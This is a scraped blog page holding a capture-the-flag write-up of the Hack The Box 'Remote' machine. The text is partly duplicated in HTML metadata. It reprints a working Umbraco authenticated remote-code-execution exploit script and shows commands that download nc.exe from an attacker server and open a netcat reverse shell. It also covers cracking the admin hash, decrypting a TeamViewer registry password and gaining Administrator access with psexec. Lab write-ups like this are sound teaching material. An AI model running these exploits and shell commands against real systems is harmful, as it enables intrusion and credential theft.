System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = &quot;%s&quot;; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } &lt;/msxsl:script&gt;&lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:value-of select=&quot;csharp_user:xml()&quot;/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; &quot;&quot;&quot; % (args.arguments, args.command) login = args.user password = args.password host = args.url # Process Login url_login = host + &quot;/umbraco/backoffice/UmbracoApi/Authentication/PostLogin&quot; loginfo = { &quot;username&quot;: login, &quot;password&quot;: password} s = requests.session() # START OF MODIFIED SECTION # r2 = s.post(url_login,json=loginfo) r2 = requests.post(url_login,json=loginfo) cookie = SimpleCookie() cookie.load(r2.headers[&quot;Set-Cookie&quot;]) for key,value in cookie.items(): cookie_obj = requests.cookies.create_cookie(name=key,value=value.value) s.cookies.set_cookie(cookie_obj) # END OF MODIFIED SECTION # Go to vulnerable web page url_xslt = host + &quot;/umbraco/developer/Xslt/xsltVisualize.aspx&quot; r3 = s.get(url_xslt) soup = BeautifulSoup(r3.text, &#39;html.parser&#39;) VIEWSTATE = soup.find(id=&quot;__VIEWSTATE&quot;)[&#39;value&#39;] VIEWSTATEGENERATOR = soup.find(id=&quot;__VIEWSTATEGENERATOR&quot;)[&#39;value&#39;] UMBXSRFTOKEN = s.cookies[&#39;UMB-XSRF-TOKEN&#39;] headers = {&#39;UMB-XSRF-TOKEN&#39;: UMBXSRFTOKEN} data = { &quot;__EVENTTARGET&quot;: &quot;&quot;, &quot;__EVENTARGUMENT&quot;: &quot;&quot;, &quot;__VIEWSTATE&quot;: VIEWSTATE, &quot;__VIEWSTATEGENERATOR&quot;: VIEWSTATEGENERATOR, &quot;ctl00$body$xsltSelection&quot;: payload, &quot;ctl00$body$contentPicker$ContentIdValue&quot;: &quot;&quot;, &quot;ctl00$body$visualizeDo&quot;: &quot;Visualize+XSLT&quot; } # Launch the attack r4 = s.post(url_xslt, data=data, headers=headers) # print(r4.text) # Filter output soup = BeautifulSoup(r4.text, &#39;html.parser&#39;) CMDOUTPUT = soup.find(id=&quot;result&quot;).getText() print(CMDOUTPUT) Now, lets test it out. 1 2 3 $ python umbraco.py -u &#39;admin@htb.local&#39; -p &#39;baconandcheese&#39; -i http://remote.htb -c cmd.exe -a &quot;/c whoami&quot; iis apppool\defaultapppool With RCE on the box, we can now upload our nc.exe to it and establish a reverse shell. 1 2 3 4 5 6 7 8 9 10 11 $ python umbraco.py -u &#39;admin@htb.local&#39; -p &#39;baconandcheese&#39; -i http://remote.htb -c cmd.exe -a &quot;/c mkdir C:\\\\tmp&quot; $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... $ python umbraco.py -u &#39;admin@htb.local&#39; -p &#39;baconandcheese&#39; -i http://remote.htb -c cmd.exe -a &quot;/c curl http://10.10.XX.XX/nc.exe &gt; C:\\\\tmp\\\\nc.exe&quot; $ nc -lvnp 1337 istening on [any] 1337 ... $ python umbraco.py -u &#39;admin@htb.local&#39; -p &#39;baconandcheese&#39; -i http://remote.htb -c cmd.exe -a &quot;/c C:\\\\tmp\\\\nc.exe -e cmd.exe 10.10.XX.XX 1337&quot; On our nc listener`, we catch our reverse shell. 1 2 3 4 5 6 7 listening on [any] 1337 ... connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.180] 49708 Microsoft Windows [Version 10.0.17763.107] (c) 2018 Microsoft Corporation. All rights reserved. c:\windows\system32\inetsrv&gt;whoami iis apppool\defaultapppool user.txt As the current user did not have a home directory, I had to resort to using where to find it. 1 2 3 4 c:\windows\system32\inetsrv&gt; where /R C:\ user.txt C:\Users\Public\user.txt c:\windows\system32\inetsrv&gt; type C:\Users\Public\user.txt cf70XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) Lets check whats installed on the system. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 c:\windows\system32\inetsrv&gt; dir &quot;C:\Program Files&quot; Volume in drive C has no label. Volume Serial Number is BE23-EB3E Directory of C:\Program Files 02/23/2020 03:19 PM &lt;DIR&gt; . 02/23/2020 03:19 PM &lt;DIR&gt; .. 02/19/2020 04:04 PM &lt;DIR&gt; Common Files 09/15/2018 05:06 AM &lt;DIR&gt; internet explorer 02/23/2020 03:16 PM &lt;DIR&gt; Microsoft SQL Server 02/19/2020 04:11 PM &lt;DIR&gt; MSBuild 02/19/2020 04:11 PM &lt;DIR&gt; Reference Assemblies 02/19/2020 04:04 PM &lt;DIR&gt; VMware 02/20/2020 07:46 AM &lt;DIR&gt; Windows Defender 09/15/2018 05:05 AM &lt;DIR&gt; Windows Defender Advanced Threat Protection 09/15/2018 03:19 AM &lt;DIR&gt; Windows Mail 10/29/2018 06:39 PM &lt;DIR&gt; Windows Media Player 09/15/2018 03:19 AM &lt;DIR&gt; Windows Multimedia Platform 09/15/2018 03:28 AM &lt;DIR&gt; windows nt 10/29/2018 06:39 PM &lt;DIR&gt; Windows Photo Viewer 09/15/2018 03:19 AM &lt;DIR&gt; Windows Portable Devices 09/15/2018 03:19 AM &lt;DIR&gt; Windows Security 09/15/2018 03:19 AM &lt;DIR&gt; WindowsPowerShell 0 File(s) 0 bytes 18 Dir(s) 19,394,420,736 bytes free c:\windows\system32\inetsrv&gt; dir &quot;C:\Program Files (x86)&quot; Volume in drive C has no label. Volume Serial Number is BE23-EB3E Directory of C:\Program Files (x86) 02/23/2020 03:19 PM &lt;DIR&gt; . 02/23/2020 03:19 PM &lt;DIR&gt; .. 09/15/2018 03:28 AM &lt;DIR&gt; Common Files 09/15/2018 05:06 AM &lt;DIR&gt; Internet Explorer 02/23/2020 03:19 PM &lt;DIR&gt; Microsoft SQL Server 02/23/2020 03:15 PM &lt;DIR&gt; Microsoft.NET 02/19/2020 04:11 PM &lt;DIR&gt; MSBuild 02/19/2020 04:11 PM &lt;DIR&gt; Reference Assemblies 02/20/2020 03:14 AM &lt;DIR&gt; TeamViewer 09/15/2018 05:05 AM &lt;DIR&gt; Windows Defender 09/15/2018 03:19 AM &lt;DIR&gt; Windows Mail 10/29/2018 06:39 PM &lt;DIR&gt; Windows Media Player 09/15/2018 03:19 AM &lt;DIR&gt; Windows Multimedia Platform 09/15/2018 03:28 AM &lt;DIR&gt; windows nt 10/29/2018 06:39 PM &lt;DIR&gt; Windows Photo Viewer 09/15/2018 03:19 AM &lt;DIR&gt; Windows Portable Devices 09/15/2018 03:19 AM &lt;DIR&gt; WindowsPowerShell 0 File(s) 0 bytes 17 Dir(s) 19,394,396,160 bytes free “TeamViewer”? This definitely seem worth looking into. Maybe there are saved passwords? I couldn’t find any config files containing saved passwords so another location that stores configs is probably the registry. 1 2 3 4 5 6 7 8 9 c:\windows\system32\inetsrv&gt; reg query HKLM /s /k /f &quot;TeamViewer&quot; HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\TeamViewer 7 HKEY_LOCAL_MACHINE\SOFTWARE\TeamViewer HKEY_LOCAL_MACHINE\SOFTWARE\Classes\TeamViewerConfiguration HKEY_LOCAL_MACHINE\SOFTWARE\Classes\TeamViewerSession HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\TeamViewer7 HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\TeamViewer7 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TeamViewer7 End of search: 7 match(es) found HKEY_LOCAL_MACHINE\SOFTWARE\TeamViewer seems promising so lets check that out. 1 2 3 4 5 6 c:\windows\system32\inetsrv&gt; reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\TeamViewer&quot; /s ... HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7 ... SecurityPasswordAES REG_BINARY FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B ... Seems like I was right! Using this script from this link, I was able to retrieve the decrypted password. 1 2 3 4 5 6 7 8 9 10 $ python3 tv.py This is a quick and dirty Teamviewer password decrypter basis wonderful post by @whynotsecurity. Read this blogpost if you haven&#39;t already : https://whynotsecurity.com/blog/teamviewer Please check below mentioned registry values and enter its value manually without spaces. &quot;SecurityPasswordAES&quot; OR &quot;OptionsPasswordAES&quot; OR &quot;SecurityPasswordExported&quot; OR &quot;PermanentPassword&quot; Enter output from registry without spaces : FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B Decrypted password is : !R3m0te! root.txt With !R3m0te!, lets check if we can get into the Administrator’s account. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ python psexec.py &#39;Administrator:!R3m0te!@remote.htb&#39; Impacket v0.9.22.dev1+20200713.100928.1e84ad60 - Copyright 2020 SecureAuth Corporation [*] Requesting shares on remote.htb..... [*] Found writable share ADMIN$ [*] Uploading file FNFPcETB.exe [*] Opening SVCManager on remote.htb..... [*] Creating service xGXs on remote.htb..... [*] Starting service xGXs..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.17763.107] (c) 2018 Microsoft Corporation. All rights reserved. C:\Windows\system32&gt;type C:\Users\Administrator\Desktop\root.txt baceXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><link rel="canonical" href="https://rizemon.github.io/posts/remote-htb/" /><meta property="og:url" content="https://rizemon.github.io/posts/remote-htb/" /><meta property="og:site_name" content="rizemon’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-09-06T14:23:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Remote" /><meta name="twitter:site" content="@rizemon" /><meta name="twitter:creator" content="@rizemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"rizemon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rizemon.github.io/posts/remote-htb/"},"description":"From this write-up, I probably learnt that it is best to get the screenshots and command outputs immediately or while you pwn the box as your exploits may not work in the future. However, it did teach me not to blindly rely on the online scripts to work perfectly everytime and I learnt how to fix them :) Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.180 remote.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 $ nmap -sV -sT -sC remote.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-22 05:30 EDT Nmap scan report for remote.htb (10.10.10.180) Host is up (0.27s latency). Not shown: 992 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Home - Acme Widgets 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/tcp6 rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 2,3,4 111/udp6 rpcbind | 100003 2,3 2049/udp nfs | 100003 2,3 2049/udp6 nfs | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100005 1,2,3 2049/tcp mountd | 100005 1,2,3 2049/tcp6 mountd | 100005 1,2,3 2049/udp mountd | 100005 1,2,3 2049/udp6 mountd | 100021 1,2,3,4 2049/tcp nlockmgr | 100021 1,2,3,4 2049/tcp6 nlockmgr | 100021 1,2,3,4 2049/udp nlockmgr | 100021 1,2,3,4 2049/udp6 nlockmgr | 100024 1 2049/tcp status | 100024 1 2049/tcp6 status | 100024 1 2049/udp status |_ 100024 1 2049/udp6 status 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 1119/tcp filtered bnetgame 2049/tcp open mountd 1-3 (RPC #100005) Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 2m12s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-03-22T09:34:15 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 268.43 seconds Enumeration (1) Even though Anonymous FTP login was allowed, there was no files on the ftp service on port 21 :( Moving on, we see a http service running port 80 so lets check that out. This website seems like its based on a web template but let’s continue crawling around… http://remote.htb/contact/: On this page was this button that brings me to a login page of a content management system (CMS) called Umbraco! We don’t have credentials to login with but I did find an exploit we can possibly use on this CMS. However, this exploit require us to be authenticated but we can keep this exploit for later on. Going back to the scan results, we see a large chuck of rpcbind information from port 111, but below that we see a mountd service running on port 2049 Using showmount, we can see what NFS (Network File Share) shares are available on the service. 1 2 3 $ showmount -e remote.htb Export list for remote.htb: /site_backups (everyone) Lets try mounting it on our machine: 1 2 $ mkdir /mnt/nfs $ mount -t nfs -o vers=3 remote.htb:/site_backups /mnt/nfs No output but I guess it worked? Lets see whats inside! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ cd /mnt/nfs $ ls -al total 123 drwx------ 2 4294967294 4294967294 4096 Aug 15 11:12 . drwxr-xr-x 3 root root 4096 Aug 16 15:15 .. drwx------ 2 4294967294 4294967294 64 Feb 20 12:16 App_Browsers drwx------ 2 4294967294 4294967294 4096 Feb 20 12:17 App_Data drwx------ 2 4294967294 4294967294 4096 Feb 20 12:16 App_Plugins drwx------ 2 4294967294 4294967294 64 Feb 20 12:16 aspnet_client drwx------ 2 4294967294 4294967294 49152 Feb 20 12:16 bin drwx------ 2 4294967294 4294967294 8192 Feb 20 12:16 Config drwx------ 2 4294967294 4294967294 64 Feb 20 12:16 css -rwx------ 1 4294967294 4294967294 152 Nov 1 2018 default.aspx -rwx------ 1 4294967294 4294967294 89 Nov 1 2018 Global.asax drwx------ 2 4294967294 4294967294 4096 Feb 20 12:16 Media drwx------ 2 4294967294 4294967294 64 Feb 20 12:16 scripts drwx------ 2 4294967294 4294967294 8192 Feb 20 12:16 Umbraco drwx------ 2 4294967294 4294967294 4096 Feb 20 12:16 Umbraco_Client drwx------ 2 4294967294 4294967294 4096 Feb 20 12:16 Views -rwx------ 1 4294967294 4294967294 28539 Feb 20 00:57 Web.config This seem like a folder containing the contents of the Umbraco CMS. Since this files and folders could be a backup of the current Umbraco instance that is running, lets see if we can find any hard-coded configuration or credentials we can use. Digging around, I found a Umbraco.sdf under App_Data. Searching online, it says that this file was an SQL file containing the contents of the Umbraco CMS! Nice! However, this file is in binary but we can run strings on it and eyeball for information. 1 2 3 4 5 6 7 8 9 $ strings Umbraco.sdf | less ... Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50 adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749 ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32 ... Alright, we see what seems to be login information such as the username, email, password hashes as well as the hash algorithm used. We can see 2 users: admin and ssmith, but hash of admin@htb.local is in SHA1 while the hash of ssmith@htb.local is in HMACSHA256. HMACSHA256 needs a key to be cracked but we are not sure how it was implemented in this system but we can definitely crack the SHA1 hash online. https://crackstation.net/: Lets check if baconandcheese is still being used for the admin@htb.local account. After pressing “Login”, nothing appeared on webpage but we know that the login was successful. Remember the exploit we found just now? Lets see if this exploit works with our credentials that we found. Exploitation 1 2 3 4 $ python umbraco.py -u &#39;admin@htb.local&#39; -p &#39;baconandcheese&#39; -i http://remote.htb -c cmd.exe -a &quot;/c whoami&quot; k (most recent call last): File &quot;umbraco3.py&quot;, line 53, in &lt;module&gt; VIEWSTATE = soup.find(id=&quot;__VIEWSTATE&quot;)[&#39;value&#39;] When I first pwned this box, this exploit was working fine! Fortunately, I was able to debug and realised that the new cookies set after successful logon were not being saved properly, so I tweaked the script a little: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 # Exploit Title: Umbraco CMS - Authenticated Remote Code Execution # Date: 2020-03-28 # Exploit Author: Alexandre ZANNI (noraj) # Based on: https://www.exploit-db.com/exploits/46153 # Vendor Homepage: http://www.umbraco.com/ # Software Link: https://our.umbraco.com/download/releases # Version: 7.12.4 # Category: Webapps # Tested on: Windows IIS # Example: python exploit.py -u admin@example.org -p password123 -i &#39;http://10.0.0.1&#39; -c ipconfig import requests import re import argparse from http.cookies import SimpleCookie from bs4 import BeautifulSoup parser = argparse.ArgumentParser(prog=&#39;exploit.py&#39;, description=&#39;Umbraco authenticated RCE&#39;, formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=80)) parser.add_argument(&#39;-u&#39;, &#39;--user&#39;, metavar=&#39;USER&#39;, type=str, required=True, dest=&#39;user&#39;, help=&#39;username / email&#39;) parser.add_argument(&#39;-p&#39;, &#39;--password&#39;, metavar=&#39;PASS&#39;, type=str, required=True, dest=&#39;password&#39;, help=&#39;password&#39;) parser.add_argument(&#39;-i&#39;, &#39;--host&#39;, metavar=&#39;URL&#39;, type=str, required=True, dest=&#39;url&#39;, help=&#39;root URL&#39;) parser.add_argument(&#39;-c&#39;, &#39;--command&#39;, metavar=&#39;CMD&#39;, type=str, required=True, dest=&#39;command&#39;, help=&#39;command&#39;) parser.add_argument(&#39;-a&#39;, &#39;--arguments&#39;, metavar=&#39;ARGS&#39;, type=str, required=False, dest=&#39;arguments&#39;, help=&#39;arguments&#39;, default=&#39;&#39;) args = parser.parse_args() # Payload payload = &quot;&quot;&quot;\\ &lt;?xml version=&quot;1.0&quot;?&gt;&lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot; xmlns:csharp_user=&quot;http://csharp.mycompany.com/mynamespace&quot;&gt;&lt;msxsl:script language=&quot;C#&quot; implements-prefix=&quot;csharp_user&quot;&gt;public string xml() { string cmd = &quot;%s&quot;; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = &quot;%s&quot;; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } &lt;/msxsl:script&gt;&lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:value-of select=&quot;csharp_user:xml()&quot;/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; &quot;&quot;&quot; % (args.arguments, args.command) login = args.user password = args.password host = args.url # Process Login url_login = host + &quot;/umbraco/backoffice/UmbracoApi/Authentication/PostLogin&quot; loginfo = { &quot;username&quot;: login, &quot;password&quot;: password} s = requests.session() # START OF MODIFIED SECTION # r2 = s.post(url_login,json=loginfo) r2 = requests.post(url_login,json=loginfo) cookie = SimpleCookie() cookie.load(r2.headers[&quot;Set-Cookie&quot;]) for key,value in cookie.items(): cookie_obj = requests.cookies.create_cookie(name=key,value=value.value) s.cookies.set_cookie(cookie_obj) # END OF MODIFIED SECTION # Go to vulnerable web page url_xslt = host + &quot;/umbraco/developer/Xslt/xsltVisualize.aspx&quot; r3 = s.get(url_xslt) soup = BeautifulSoup(r3.text, &#39;html.parser&#39;) VIEWSTATE = soup.find(id=&quot;__VIEWSTATE&quot;)[&#39;value&#39;] VIEWSTATEGENERATOR = soup.find(id=&quot;__VIEWSTATEGENERATOR&quot;)[&#39;value&#39;] UMBXSRFTOKEN = s.cookies[&#39;UMB-XSRF-TOKEN&#39;] headers = {&#39;UMB-XSRF-TOKEN&#39;: UMBXSRFTOKEN} data = { &quot;__EVENTTARGET&quot;: &quot;&quot;, &quot;__EVENTARGUMENT&quot;: &quot;&quot;, &quot;__VIEWSTATE&quot;: VIEWSTATE, &quot;__VIEWSTATEGENERATOR&quot;: VIEWSTATEGENERATOR, &quot;ctl00$body$xsltSelection&quot;: payload, &quot;ctl00$body$contentPicker$ContentIdValue&quot;: &quot;&quot;, &quot;ctl00$body$visualizeDo&quot;: &quot;Visualize+XSLT&quot; } # Launch the attack r4 = s.post(url_xslt, data=data, headers=headers) # print(r4.text) # Filter output soup = BeautifulSoup(r4.text, &#39;html.parser&#39;) CMDOUTPUT = soup.find(id=&quot;result&quot;).getText() print(CMDOUTPUT) Now, lets test it out. 1 2 3 $ python umbraco.py -u &#39;admin@htb.local&#39; -p &#39;baconandcheese&#39; -i http://remote.htb -c cmd.exe -a &quot;/c whoami&quot; iis apppool\\defaultapppool With RCE on the box, we can now upload our nc.exe to it and establish a reverse shell. 1 2 3 4 5 6 7 8 9 10 11 $ python umbraco.py -u &#39;admin@htb.local&#39; -p &#39;baconandcheese&#39; -i http://remote.htb -c cmd.exe -a &quot;/c mkdir C:\\\\\\\\tmp&quot; $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... $ python umbraco.py -u &#39;admin@htb.local&#39; -p &#39;baconandcheese&#39; -i http://remote.htb -c cmd.exe -a &quot;/c curl http://10.10.XX.XX/nc.exe &gt; C:\\\\\\\\tmp\\\\\\\\nc.exe&quot; $ nc -lvnp 1337 istening on [any] 1337 ... $ python umbraco.py -u &#39;admin@htb.local&#39; -p &#39;baconandcheese&#39; -i http://remote.htb -c cmd.exe -a &quot;/c C:\\\\\\\\tmp\\\\\\\\nc.exe -e cmd.exe 10.10.XX.XX 1337&quot; On our nc listener`, we catch our reverse shell. 1 2 3 4 5 6 7 listening on [any] 1337 ... connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.180] 49708 Microsoft Windows [Version 10.0.17763.107] (c) 2018 Microsoft Corporation. All rights reserved. c:\\windows\\system32\\inetsrv&gt;whoami iis apppool\\defaultapppool user.txt As the current user did not have a home directory, I had to resort to using where to find it. 1 2 3 4 c:\\windows\\system32\\inetsrv&gt; where /R C:\\ user.txt C:\\Users\\Public\\user.txt c:\\windows\\system32\\inetsrv&gt; type C:\\Users\\Public\\user.txt cf70XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) Lets check whats installed on the system. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 c:\\windows\\system32\\inetsrv&gt; dir &quot;C:\\Program Files&quot; Volume in drive C has no label. Volume Serial Number is BE23-EB3E Directory of C:\\Program Files 02/23/2020 03:19 PM &lt;DIR&gt; . 02/23/2020 03:19 PM &lt;DIR&gt; .. 02/19/2020 04:04 PM &lt;DIR&gt; Common Files 09/15/2018 05:06 AM &lt;DIR&gt; internet explorer 02/23/2020 03:16 PM &lt;DIR&gt; Microsoft SQL Server 02/19/2020 04:11 PM &lt;DIR&gt; MSBuild 02/19/2020 04:11 PM &lt;DIR&gt; Reference Assemblies 02/19/2020 04:04 PM &lt;DIR&gt; VMware 02/20/2020 07:46 AM &lt;DIR&gt; Windows Defender 09/15/2018 05:05 AM &lt;DIR&gt; Windows Defender Advanced Threat Protection 09/15/2018 03:19 AM &lt;DIR&gt; Windows Mail 10/29/2018 06:39 PM &lt;DIR&gt; Windows Media Player 09/15/2018 03:19 AM &lt;DIR&gt; Windows Multimedia Platform 09/15/2018 03:28 AM &lt;DIR&gt; windows nt 10/29/2018 06:39 PM &lt;DIR&gt; Windows Photo Viewer 09/15/2018 03:19 AM &lt;DIR&gt; Windows Portable Devices 09/15/2018 03:19 AM &lt;DIR&gt; Windows Security 09/15/2018 03:19 AM &lt;DIR&gt; WindowsPowerShell 0 File(s) 0 bytes 18 Dir(s) 19,394,420,736 bytes free c:\\windows\\system32\\inetsrv&gt; dir &quot;C:\\Program Files (x86)&quot; Volume in drive C has no label. Volume Serial Number is BE23-EB3E Directory of C:\\Program Files (x86) 02/23/2020 03:19 PM &lt;DIR&gt; . 02/23/2020 03:19 PM &lt;DIR&gt; .. 09/15/2018 03:28 AM &lt;DIR&gt; Common Files 09/15/2018 05:06 AM &lt;DIR&gt; Internet Explorer 02/23/2020 03:19 PM &lt;DIR&gt; Microsoft SQL Server 02/23/2020 03:15 PM &lt;DIR&gt; Microsoft.NET 02/19/2020 04:11 PM &lt;DIR&gt; MSBuild 02/19/2020 04:11 PM &lt;DIR&gt; Reference Assemblies 02/20/2020 03:14 AM &lt;DIR&gt; TeamViewer 09/15/2018 05:05 AM &lt;DIR&gt; Windows Defender 09/15/2018 03:19 AM &lt;DIR&gt; Windows Mail 10/29/2018 06:39 PM &lt;DIR&gt; Windows Media Player 09/15/2018 03:19 AM &lt;DIR&gt; Windows Multimedia Platform 09/15/2018 03:28 AM &lt;DIR&gt; windows nt 10/29/2018 06:39 PM &lt;DIR&gt; Windows Photo Viewer 09/15/2018 03:19 AM &lt;DIR&gt; Windows Portable Devices 09/15/2018 03:19 AM &lt;DIR&gt; WindowsPowerShell 0 File(s) 0 bytes 17 Dir(s) 19,394,396,160 bytes free “TeamViewer”? This definitely seem worth looking into. Maybe there are saved passwords? I couldn’t find any config files containing saved passwords so another location that stores configs is probably the registry. 1 2 3 4 5 6 7 8 9 c:\\windows\\system32\\inetsrv&gt; reg query HKLM /s /k /f &quot;TeamViewer&quot; HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\TeamViewer 7 HKEY_LOCAL_MACHINE\\SOFTWARE\\TeamViewer HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\TeamViewerConfiguration HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\TeamViewerSession HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\TeamViewer7 HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet002\\Services\\TeamViewer7 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\TeamViewer7 End of search: 7 match(es) found HKEY_LOCAL_MACHINE\\SOFTWARE\\TeamViewer seems promising so lets check that out. 1 2 3 4 5 6 c:\\windows\\system32\\inetsrv&gt; reg query &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\TeamViewer&quot; /s ... HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version7 ... SecurityPasswordAES REG_BINARY FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B ... Seems like I was right! Using this script from this link, I was able to retrieve the decrypted password. 1 2 3 4 5 6 7 8 9 10 $ python3 tv.py This is a quick and dirty Teamviewer password decrypter basis wonderful post by @whynotsecurity. Read this blogpost if you haven&#39;t already : https://whynotsecurity.com/blog/teamviewer Please check below mentioned registry values and enter its value manually without spaces. &quot;SecurityPasswordAES&quot; OR &quot;OptionsPasswordAES&quot; OR &quot;SecurityPasswordExported&quot; OR &quot;PermanentPassword&quot; Enter output from registry without spaces : FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B Decrypted password is : !R3m0te! root.txt With !R3m0te!, lets check if we can get into the Administrator’s account. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ python psexec.py &#39;Administrator:!R3m0te!@remote.htb&#39; Impacket v0.9.22.dev1+20200713.100928.1e84ad60 - Copyright 2020 SecureAuth Corporation [*] Requesting shares on remote.htb..... [*] Found writable share ADMIN$ [*] Uploading file FNFPcETB.exe [*] Opening SVCManager on remote.htb..... [*] Creating service xGXs on remote.htb..... [*] Starting service xGXs..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.17763.107] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt;type C:\\Users\\Administrator\\Desktop\\root.txt 